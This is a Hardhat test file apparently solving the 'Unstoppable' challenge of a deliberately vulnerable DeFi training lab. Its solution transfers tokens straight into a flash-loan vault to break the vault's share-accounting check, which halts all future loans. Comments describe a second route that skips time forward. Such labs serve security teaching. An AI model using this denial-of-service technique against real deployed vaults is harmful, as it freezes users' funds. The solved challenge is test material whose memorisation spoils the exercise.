const { ethers, network } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Unstoppable", function () {
  let deployer, player, someUser;
  let token, vault, receiverContract;

  const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;
  const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    [deployer, player, someUser] = await ethers.getSigners();

    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    vault = await (
      await ethers.getContractFactory("UnstoppableVault", deployer)
    ).deploy(
      token.address,
      deployer.address, // owner
      deployer.address // fee recipient
    );
    expect(await vault.asset()).to.eq(token.address);

    await token.approve(vault.address, TOKENS_IN_VAULT);
    await vault.deposit(TOKENS_IN_VAULT, deployer.address);

    expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT);
    expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT);
    expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);
    expect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT);
    expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0);
    expect(await vault.flashFee(token.address, TOKENS_IN_VAULT)).to.eq(
      50000n * 10n ** 18n
    );

    await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);
    expect(await token.balanceOf(player.address)).to.eq(
      INITIAL_PLAYER_TOKEN_BALANCE
    );

    // Show it's possible for someUser to take out a flash loan
    receiverContract = await (
      await ethers.getContractFactory("ReceiverUnstoppable", someUser)
    ).deploy(vault.address);
    await receiverContract.executeFlashLoan(100n * 10n ** 18n);
  });

  // There are 'technically' 2 solutions to this challenge.
  // 1. We can jump 30 days into the future to end the free fee grace period,
  // which will trigger the UnexpectedFlashLoan revert in the ReceiverUnstoppable contract.
  // 2. Transferring the DVT tokens to the contract without going through the deposit function
  // will cause the `convertToShares(totalSupply) != balanceBefore` check to trigger.
  // This is because balanceBefore is calculated at run time with token.balanceOf() while the other is stored in ERC4626.
  //
  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    // // Time travelling to end the free fee grace period
    // await network.provider.request({
    //   method: "evm_increaseTime",
    //   params: [60 * 60 * 24 * 30], // 30 days
    // });

    const attackerTokenContract = token.connect(player);
    await attackerTokenContract.transfer(
      vault.address,
      INITIAL_PLAYER_TOKEN_BALANCE
    );
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // It is no longer possible to execute flash loans
    await expect(
      receiverContract.executeFlashLoan(100n * 10n ** 18n)
    ).to.be.reverted;
  });
});
